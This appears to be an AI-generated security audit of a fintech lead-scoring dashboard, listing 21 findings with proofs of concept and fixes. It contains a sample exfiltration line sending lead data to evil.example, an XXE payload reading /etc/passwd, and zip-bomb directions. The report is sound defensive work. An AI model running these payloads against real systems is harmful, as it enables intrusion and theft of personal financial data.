# Security Audit — CreditCheck Dashboard
**Date**: 2026-03-14
**Auditor**: Claude Code (Senior AppSec, Fintech/Open Banking)
**Classification**: CONFIDENTIAL — Internal Use Only
**Scope**: Full codebase — `leads_dashboard_en (2).jsx`, `src/utils/`, `src/context/`, `vite.config.js`, `index.html`, `package.json`

---

## Executive Summary

This dashboard processes **sensitive PII and financial data**: Open Banking profiles, credit scores, IBANs, income, employment, and loan amounts. The product has regulatory exposure to **GDPR, PSD2, and potential FCA/Banco de España scrutiny**.

**21 findings** were identified across all severity levels. The most critical gap is the **complete absence of authentication and authorization** — anyone with the URL can view all leads, export PII, and modify partner revenue models. Several additional GDPR violations and a missing Content Security Policy compound the risk.

**Overall Risk Rating: CRITICAL — Not suitable for production deployment.**

---

## Finding Index

| ID | Title | Severity |
|----|-------|----------|
| C-01 | No authentication or authorization | CRITICAL |
| C-02 | PII and financial data in plaintext browser storage | CRITICAL |
| C-03 | GDPR: no consent, no retention policy, no right to deletion | CRITICAL |
| H-01 | Unvalidated XLSX file upload (XXE / zip bomb) | HIGH |
| H-02 | No rate limiting on live data fetch | HIGH |
| H-03 | PII logged to console in ErrorBoundary | HIGH |
| H-04 | Hardcoded API endpoint fetched without authentication | HIGH |
| H-05 | No CSRF protection on state-changing fetch | HIGH |
| M-01 | External XLSX library loaded from CDN without SRI | MEDIUM |
| M-02 | No Content Security Policy | MEDIUM |
| M-03 | Missing HTTP security headers | MEDIUM |
| M-04 | Plaintext data exports (CSV/JSON/TSV) with no access control | MEDIUM |
| M-05 | No input validation or bounds checking on financial fields | MEDIUM |
| M-06 | Sensitive HTML report generated client-side with no access control | MEDIUM |
| M-07 | Internal team emails hardcoded in source | MEDIUM |
| M-08 | No pagination on Leads tab — browser DoS with large datasets | MEDIUM |
| L-01 | Cookie security flags not set (HttpOnly, Secure, SameSite) | LOW |
| L-02 | No audit log for sensitive actions | LOW |
| L-03 | No dependency vulnerability scanning in CI | LOW |
| L-04 | Source maps may be exposed in production build | LOW |
| L-05 | Heuristic vehicle loan classification (accuracy risk) | LOW |

---

## CRITICAL

---

### [CRITICAL] C-01 — No authentication or authorization

- **Location:** `leads_dashboard_en (2).jsx` — entire application
- **Risk:** Anyone with the URL can view all lead PII and financials, upload datasets, export all data to CSV, modify partner revenue models, and delete partner records. No login screen, no session check, no role enforcement anywhere in the codebase.
- **Proof of concept:** Open the dashboard URL in an incognito window. The full dashboard renders with all data visible. Navigate to the export modal and download all leads with income, email, loan amount, and employment status. Navigate to the MultiPartner tab and modify or delete partner CPL/CPA rates.
- **Fix:**
  1. Add an authentication gate before rendering `<AppInner />`. Use OAuth2/OIDC (Google Workspace, Azure AD, or a dedicated IdP). At minimum, enforce a shared secret token checked against an environment variable.
  2. Define roles: `admin`, `viewer`, `partner_manager`. Wrap sensitive actions (`export`, `upload`, `partner edit`) with role checks.
  3. Store session in a short-lived JWT (1h expiry) with refresh token rotation.
  4. Redirect unauthenticated users to a login page; never render PII in the DOM before auth succeeds.

---

### [CRITICAL] C-02 — PII and financial data in plaintext browser storage

- **Location:** `leads_dashboard_en (2).jsx` lines ~3933–3960
- **Risk:** Partner objects (names, CPL/CPA rates, monthly revenue) are persisted via `window.storage.set(key, JSON.stringify(value))` in plaintext. Any script with access to `window.storage` — including injected third-party scripts or a XSS payload — can read the full partner dataset. On shared or managed devices, the storage persists after the browser tab is closed.
- **Proof of concept:**
  ```js
  // In browser console, after loading the dashboard:
  window.storage.get("cc_partners").then(v => console.log(JSON.parse(v)));
  // Returns: [{ name: "...", cpl: 25, cpa: 0.08, monthlyRevenue: [...] }]
  ```
- **Fix:**
  1. Encrypt stored values before write using the Web Crypto API (AES-GCM, 256-bit key derived from the authenticated user's session token).
  2. Set a TTL on stored data; clear on logout.
  3. Avoid storing financial model data client-side at all — fetch from a backend API on demand, authorized by session token.

---

### [CRITICAL] C-03 — GDPR: no consent, no retention policy, no right to deletion

- **Location:** Entire codebase
- **Relevant Articles:** GDPR Art. 5(1)(e), Art. 6, Art. 17, Art. 20, Art. 25, Art. 32
- **Risk:** The dashboard processes names, email addresses, income, loan amounts, employment status, IBAN-linked bank data, and credit scores — all of which are personal data under GDPR. No lawful basis for processing is documented in code, no consent modal is shown before uploading lead data, data is stored without a retention limit, and there is no mechanism for a data subject to request deletion or export of their own data. Regulatory fines under GDPR can reach €20M or 4% of global annual turnover.
- **Proof of concept:** Upload an XLSX with 500 leads. Close the browser. Reopen the dashboard. All 500 leads are still present — no expiry, no deletion prompt. There is no "Delete Lead" button accessible by the data subject, only an admin-level "clear all" not tied to any individual request workflow.
- **Fix:**
  1. Document and enforce a lawful basis (likely Art. 6(1)(b) — contractual necessity, or Art. 6(1)(f) — legitimate interest with a LIA). Add a consent checkpoint before the first XLSX upload.
  2. Implement a configurable retention period (default: 90 days). Auto-delete leads older than the threshold. Show a countdown in the UI.
  3. Add a "Delete This Lead" action that permanently removes the record from storage and logs the deletion (subject ID, timestamp, reason, operator).
  4. Implement a data portability export for individual leads (Art. 20).
  5. Review whether `window.storage` provides encryption at rest; if not, treat this as Art. 32 non-compliance.

---

## HIGH

---

### [HIGH] H-01 — Unvalidated XLSX file upload (XXE / zip bomb)

- **Location:** `leads_dashboard_en (2).jsx` lines ~524–577; `src/utils/xlsxParser.js`
- **Risk:** The file upload handler reads the raw `ArrayBuffer` and passes it directly to `XLSX.read()` with no file type verification, no size cap, and no sanitization. XLSX files are ZIP archives containing XML. A crafted file can exploit XML External Entity (XXE) injection to read server-side files, or use a zip bomb to exhaust browser memory and crash the tab.
- **Proof of concept:**
  ```
  Craft an XLSX where xl/workbook.xml contains:
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <foo>&xxe;</foo>
  Upload to the dashboard → XLSX parser resolves the entity → file contents exposed.
  ```
  For a zip bomb: create a 42KB ZIP that expands to 4.5GB (`42.zip`-style nested archive), rename to `.xlsx`.
- **Fix:**
  1. Validate magic bytes before parsing: XLSX must start with `PK\x03\x04` (ZIP header). Reject anything else.
  2. Enforce a file size limit before reading into memory (e.g., `if (file.size > 10 * 1024 * 1024) reject()`).
  3. Limit row count after parse (e.g., max 5 000 rows per upload).
  4. If the SheetJS version allows it, disable external entity resolution. Upgrade to latest SheetJS if not already on a patched version.
  5. Consider running the parser in a Web Worker to isolate memory exhaustion from the main thread.

---

### [HIGH] H-02 — No rate limiting on live data fetch

- **Location:** `leads_dashboard_en (2).jsx` lines ~3903–3922; `src/utils/fetchLiveData.js`
- **Risk:** The dashboard auto-fetches `https://ibancheck.io/api/credit-exports` every 60 minutes, and a "Refresh" button allows manual triggers with no debounce or cooldown. Opening multiple tabs or rapidly clicking refresh can flood the endpoint, causing a self-inflicted denial of service.
- **Proof of concept:** Open the dashboard in 10 browser tabs simultaneously. Each tab triggers its own 60-minute polling loop. Click "Refresh" in each tab repeatedly → 100+ requests to the live endpoint within seconds.
- **Fix:**
  1. Add a client-side cooldown ref:
     ```js
     const lastFetchRef = useRef(0);
     const MIN_INTERVAL_MS = 5 * 60 * 1000; // 5 minutes minimum
     const runFetch = useCallback(() => {
       if (Date.now() - lastFetchRef.current < MIN_INTERVAL_MS) return;
       lastFetchRef.current = Date.now();
       // ...existing fetch logic
     }, []);
     ```
  2. Disable the "Refresh" button for 60 seconds after each successful fetch.
  3. Implement server-side rate limiting on `/api/credit-exports` (IP + user token, max 10 req/min). Return `429 Too Many Requests` with a `Retry-After` header.
  4. Add exponential backoff on non-2xx responses.

---

### [HIGH] H-03 — PII logged to console in ErrorBoundary

- **Location:** `leads_dashboard_en (2).jsx` line ~3821
- **Risk:** The class-based `ErrorBoundary` logs the full error object and React component tree info to the browser console with `console.error("Dashboard error:", error, info)`. When an error occurs during rendering of lead data, the error payload may include serialized lead objects containing names, emails, IBANs, and financial figures. Console output is visible in DevTools, retained in browser history, and may be forwarded to third-party monitoring tools (Sentry, Datadog, etc.) if integrated later.
- **Proof of concept:** Upload an XLSX with an invalid income value that triggers a downstream rendering error. Open DevTools > Console → the full component stack trace is printed, potentially including the lead row that caused the error.
- **Fix:**
  ```js
  componentDidCatch(error, info) {
    // Log error ID only — never serialize component state or props
    const errorId = crypto.randomUUID();
    console.error(`[ErrorBoundary] errorId=${errorId} message=${error.message}`);
    // Send errorId + sanitized stack to your error tracking endpoint (no PII)
  }
  ```
  Strip any field matching `/name|email|iban|income|loan|score/i` before logging.

---

### [HIGH] H-04 — Hardcoded API endpoint fetched without authentication

- **Location:** `leads_dashboard_en (2).jsx` line ~3844; `src/utils/fetchLiveData.js` line ~10
- **Risk:** The live data endpoint `https://ibancheck.io/api/credit-exports` is hardcoded in client-side JavaScript. The fetch call sends no authentication headers. This means: (a) anyone who reads the minified bundle can discover the endpoint URL; (b) if the endpoint itself has no server-side auth, it is publicly accessible and returns the full XLSX of all leads; (c) the URL is exposed in the Network tab of any user's DevTools.
- **Proof of concept:**
  1. Open DevTools > Network tab.
  2. Reload the dashboard.
  3. Filter by `credit-exports`. Observe the full URL and response body (XLSX file).
  4. Copy the URL and open it in a new tab → if the endpoint lacks server-side auth, all lead data downloads directly.
- **Fix:**
  1. Move all API calls to a thin backend proxy (BFF pattern). The frontend calls `/api/proxy/credit-exports`; the backend adds auth headers and forwards the request.
  2. Authenticate the proxy endpoint with the user's session token.
  3. Move the real endpoint URL to a server-side environment variable — never ship it in client code.
  4. If a backend proxy is out of scope, at minimum add an `Authorization: Bearer <token>` header, where the token is injected at build time from `VITE_API_TOKEN` and rotated regularly.

---

### [HIGH] H-05 — No CSRF protection on state-changing fetch

- **Location:** `src/utils/fetchLiveData.js` line ~33; `leads_dashboard_en (2).jsx` line ~3849
- **Risk:** The live data fetch is triggered by user interaction (button click) and auto-timer, but carries no CSRF token. If the dashboard is ever embedded in an iframe or if a session cookie is used for authentication, a malicious third-party site can trick a logged-in user's browser into triggering the fetch.
- **Fix:**
  1. Use the `SameSite=Strict` attribute on any session cookies (prevents cross-site request forgery for cookie-based auth).
  2. Add a CSRF token to all non-idempotent requests:
     ```js
     headers: {
       "X-CSRF-Token": document.querySelector('meta[name="csrf-token"]')?.content ?? ""
     }
     ```
  3. Set `X-Frame-Options: DENY` to prevent iframe embedding (see M-03).

---

## MEDIUM

---

### [MEDIUM] M-01 — External XLSX library loaded from CDN without Subresource Integrity

- **Location:** `leads_dashboard_en (2).jsx` lines ~535–539; `src/utils/fetchLiveData.js` lines ~15–21
- **Risk:** The SheetJS library is dynamically injected from `cdnjs.cloudflare.com` without an `integrity` attribute. A CDN compromise or MITM attack could replace the script with a malicious version that silently exfiltrates all parsed XLSX data (leads, financials, IBANs) to an attacker-controlled server.
- **Proof of concept:** MITM the CDN response and inject `fetch('https://evil.example/'+btoa(JSON.stringify(window._parsedLeads)))` at the end of `xlsx.full.min.js`.
- **Fix:**
  1. Vendor the library locally: `npm install xlsx` (it is already in `package.json`) and import it statically. Remove the dynamic CDN loader entirely.
  2. If CDN loading must remain, add SRI:
     ```js
     Object.assign(script, {
       src: "https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.18.5/xlsx.full.min.js",
       integrity: "sha384-<BASE64_HASH_OF_FILE>",
       crossOrigin: "anonymous"
     });
     ```
     Generate the hash with: `openssl dgst -sha384 -binary xlsx.full.min.js | openssl base64 -A`

---

### [MEDIUM] M-02 — No Content Security Policy

- **Location:** `index.html`; `vite.config.js`
- **Risk:** Without a CSP, any XSS vulnerability (however minor) allows a script to access all in-memory data, read `window.storage`, and exfiltrate to an external host. The app loads inline styles and an external CDN script, making CSP non-trivial but not impossible to implement.
- **Fix:** Add a CSP `<meta>` tag in `index.html` and enforce it server-side via HTTP header:
  ```html
  <meta http-equiv="Content-Security-Policy"
    content="default-src 'self';
             script-src 'self' https://cdnjs.cloudflare.com;
             style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
             font-src https://fonts.gstatic.com;
             img-src 'self' data:;
             connect-src 'self' https://ibancheck.io;
             frame-ancestors 'none'">
  ```
  Then migrate away from `'unsafe-inline'` styles by moving inline styles to CSS classes.

---

### [MEDIUM] M-03 — Missing HTTP security headers

- **Location:** `vite.config.js`
- **Risk:** Several browser-enforced security mechanisms are inactive because the headers that enable them are absent.
- **Fix:** Add to `vite.config.js` for the dev server (and configure identically on the production web server/CDN):
  ```js
  server: {
    headers: {
      "X-Content-Type-Options": "nosniff",
      "X-Frame-Options": "DENY",
      "Referrer-Policy": "no-referrer",
      "Permissions-Policy": "camera=(), microphone=(), geolocation=()",
      "Strict-Transport-Security": "max-age=63072000; includeSubDomains; preload"
    }
  }
  ```

---

### [MEDIUM] M-04 — Plaintext data exports with no access control or audit trail

- **Location:** `leads_dashboard_en (2).jsx` lines ~3500–3530 (ExportModal)
- **Risk:** The export modal generates CSV/JSON/TSV files containing names, emails, income, loan amounts, employment status, and scores for up to 100+ leads, then triggers a browser download. There is no check that the exporting user is authorized, no log of what was exported, and the files are stored on the user's device in plaintext.
- **Fix:**
  1. Gate the export action behind an authenticated role check (`user.role === "admin" || "exporter"`).
  2. Log every export: `{ userId, timestamp, rowCount, fields, filters }` — send to a backend audit endpoint.
  3. Consider masking sensitive fields in the export preview (e.g., `j***@gmail.com`, income rounded to nearest €500).
  4. Add a visible "CONFIDENTIAL" header row to CSV/JSON exports.

---

### [MEDIUM] M-05 — No input validation or bounds checking on financial calculation fields

- **Location:** `src/utils/scoring.js` lines ~14–68
- **Risk:** `scoreLead()` uses `parseFloat()` on raw XLSX values without bounds checking. A malformed or adversarially crafted XLSX can inject `Infinity`, `NaN`, or astronomically large numbers into the scoring model, silently producing wrong scores that misclassify leads.
  ```js
  const dti = exp / inc; // inc === 0 → dti = Infinity → score branch undefined
  const lti = loan / (inc * 12); // no upper bound check
  ```
- **Fix:**
  ```js
  function safePositiveFloat(val, max = Infinity) {
    const n = parseFloat(val);
    if (!Number.isFinite(n) || n < 0) return 0;
    return Math.min(n, max);
  }
  const inc  = safePositiveFloat(r.income,     500_000);
  const exp  = safePositiveFloat(r.expenses,   500_000);
  const loan = safePositiveFloat(r.loanAmount, 500_000);
  const age  = safePositiveFloat(r.age, 120);
  if (inc === 0) return { score: 0, tier: "D", reason: "invalid_income" };
  ```

---

### [MEDIUM] M-06 — Sensitive HTML report generated client-side with no access control

- **Location:** `leads_dashboard_en (2).jsx` lines ~3105–3375 (`makeReport()`)
- **Risk:** The report generator creates a full HTML document containing lead names, scores, and financial summaries, then opens it in a new browser tab via `window.open()`. This HTML is inspectable in DevTools, can be saved to disk by any browser user, and is printed to PDF via `window.print()` which leaves a copy in the OS print queue. There is no role check before calling `makeReport()`.
- **Fix:**
  1. Add a role check before allowing report generation.
  2. Add a `window.onbeforeunload` or visibility listener to close the report tab automatically after a short timeout.
  3. Add `<meta name="robots" content="noindex, nofollow">` and `<meta http-equiv="Cache-Control" content="no-store">` to the generated HTML.
  4. Long-term: move report generation to the backend; return a time-limited signed URL to a PDF.

---

### [MEDIUM] M-07 — Internal team emails hardcoded in source

- **Location:** `src/utils/xlsxParser.js` lines ~5–18; `leads_dashboard_en (2).jsx` lines ~129–142
- **Risk:** The `isTestEmail()` function hardcodes internal addresses (`ferran@test.com`, `@clovrlabs.`, `@clorvrlabs.` — the latter appears to be a typo) and personal test patterns. These reveal internal naming conventions and the company domain. Note: `@clorvrlabs.` (with transposed letters) will silently miss matching that typo domain's emails in production data.
- **Fix:**
  1. Move the exclusion list to a `VITE_EXCLUDED_EMAIL_DOMAINS` environment variable.
  2. Fix the typo: `@clorvrlabs.` → `@clovrlabs.` (or remove if redundant).
  3. Use generic patterns (`/^test[-_+]/i`, `/\+test@/i`) rather than specific addresses.

---

### [MEDIUM] M-08 — No pagination on Leads tab — browser memory DoS with large datasets

- **Location:** `leads_dashboard_en (2).jsx` lines ~697–730
- **Risk:** The Leads table renders all filtered rows into the DOM at once. With a production dataset of 5 000+ leads, this creates 5 000+ DOM nodes, causing browser memory exhaustion, dropped frames, and an unresponsive UI. This is a self-inflicted availability issue.
- **Fix:** Apply the same `PAGE_SIZE = 50` pagination already used in the Lead Scoring tab, or use a virtualizing list (`react-window`) to render only visible rows.

---

## LOW / HARDENING

---

### [LOW] L-01 — Cookie security flags not set

- **Location:** No cookie-setting code found (relevant when authentication is added)
- **Risk:** If session cookies are introduced (as part of fixing C-01), they must carry `HttpOnly`, `Secure`, and `SameSite=Strict` flags. Without these, cookies are accessible via JavaScript (XSS theft), transmitted over HTTP, and sent in cross-site requests.
- **Fix:** Set all session cookies with: `Set-Cookie: session=<token>; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=3600`

---

### [LOW] L-02 — No audit log for sensitive actions

- **Location:** Entire codebase
- **Risk:** GDPR Art. 30 requires a Record of Processing Activities. There is currently no log of: who uploaded data, who exported leads, who generated reports, who modified partner records, or who deleted data. Without logs, a breach cannot be investigated and regulatory obligations cannot be demonstrated.
- **Fix:** Implement a lightweight client-side audit event queue that posts to a backend endpoint:
  ```js
  audit("lead_export", { userId, rowCount, fields, timestamp });
  audit("partner_modified", { userId, partnerId, diff, timestamp });
  audit("data_uploaded", { userId, fileName, rowCount, timestamp });
  ```
  Retain audit logs for a minimum of 1 year, stored separately from lead data.

---

### [LOW] L-03 — No dependency vulnerability scanning in CI

- **Location:** `package.json`
- **Risk:** The `xlsx` package (v0.18.5) is known to be unmaintained (the SheetJS team moved to a commercial `xlsx-js-style`/`ExcelJS` fork). Older versions have documented CVEs related to prototype pollution. Other dependencies (React 18.3, Recharts 2.12, Vite 5.4) should be audited regularly.
- **Fix:**
  1. Run `npm audit` now and address any flagged vulnerabilities.
  2. Add `npm audit --audit-level=high` as a CI gate that fails the build on high/critical CVEs.
  3. Consider migrating from unmaintained `xlsx@0.18.5` to `exceljs` or `papaparse` (for CSV) which are actively maintained.

---

### [LOW] L-04 — Source maps may be exposed in production build

- **Location:** `vite.config.js`
- **Risk:** Vite generates `.js.map` files by default in development and sometimes in production builds. If deployed without stripping maps, attackers can reconstruct the full source code from the minified bundle, including endpoint URLs, internal logic, and the test email list.
- **Fix:** In `vite.config.js`:
  ```js
  build: {
    sourcemap: false  // or "hidden" to keep for internal error tracking only
  }
  ```

---

### [LOW] L-05 — Heuristic vehicle loan classification (accuracy risk)

- **Location:** `src/constants/verticals.js` (`applyVehicleFilter()`); `leads_dashboard_en (2).jsx`
- **Risk:** Vehicle loans are identified by heuristic (`loanAmount > 15000 || term > 60 months`) rather than an explicit field. A personal loan of €20 000 for a kitchen renovation may be misclassified as a vehicle loan, causing the wrong partner to receive it and inflating vehicle-vertical revenue metrics.
- **Fix:** Request that the XLSX source include an explicit `purpose_category` field. Until then, document the heuristic clearly in code comments and surface a warning badge in the UI when the classification is inferred rather than explicit.

---

## GDPR / PSD2 Compliance Summary

| Requirement | Status | Finding |
|-------------|--------|---------|
| Lawful basis for processing documented | ❌ Missing | C-03 |
| Consent obtained before processing | ❌ Missing | C-03 |
| Data retention limit enforced | ❌ Missing | C-03 |
| Right to erasure (Art. 17) implemented | ❌ Missing | C-03 |
| Data portability (Art. 20) for subjects | ❌ Missing | C-03 |
| Encryption at rest (Art. 32) | ❌ Plaintext storage | C-02 |
| Encryption in transit (HTTPS) | ⚠️ Assumed — not enforced by app | M-03 |
| PII not logged to console | ❌ ErrorBoundary logs PII | H-03 |
| Data minimization | ⚠️ Exports include all fields | M-04 |
| Third-party data sharing controls | ⚠️ No DPA mechanism for partners | C-03 |
| Record of processing activities (Art. 30) | ❌ No audit log | L-02 |
| PSD2: strong customer authentication | ⚠️ N/A for dashboard; verify on API side | — |

---

## Remediation Roadmap

### Immediate (before any production traffic)
- [ ] **C-01** — Add authentication gate (OAuth2 or shared-secret JWT minimum)
- [ ] **C-02** — Encrypt `window.storage` values; clear on session end
- [ ] **C-03** — Add GDPR consent checkpoint + retention config + deletion UI
- [ ] **H-03** — Sanitize ErrorBoundary logging (no PII in console)
- [ ] **H-04** — Proxy live endpoint through backend; never ship real URL in client code

### This Sprint
- [ ] **H-01** — Validate XLSX magic bytes + size limit + row cap
- [ ] **H-02** — Add client-side cooldown + server-side rate limiting
- [ ] **H-05** — Add CSRF token or switch to SameSite=Strict cookies
- [ ] **M-01** — Vendor XLSX library locally (remove CDN dynamic loader)
- [ ] **M-02** — Add Content Security Policy
- [ ] **M-03** — Add security headers in `vite.config.js` and production web server

### Next Sprint
- [ ] **M-04** — Gate exports behind role check + audit log
- [ ] **M-05** — Add bounds-checked `safePositiveFloat()` helper in `scoring.js`
- [ ] **M-06** — Add role check + cache-control meta to generated reports
- [ ] **M-07** — Move test email list to environment variable; fix `@clorvrlabs.` typo
- [ ] **L-03** — Run `npm audit`; add as CI gate; evaluate `xlsx` replacement

### Hardening
- [ ] **L-01** — Cookie flags (when auth is added)
- [ ] **L-02** — Implement audit event log
- [ ] **L-04** — Disable source maps in production build
- [ ] **M-08** — Paginate Leads tab or add virtual scrolling

---

*This report was generated by automated static analysis and manual code review. It does not substitute for a penetration test or a formal GDPR Data Protection Impact Assessment (DPIA). A DPIA is mandatory under GDPR Art. 35 for systematic processing of financial data at scale.*
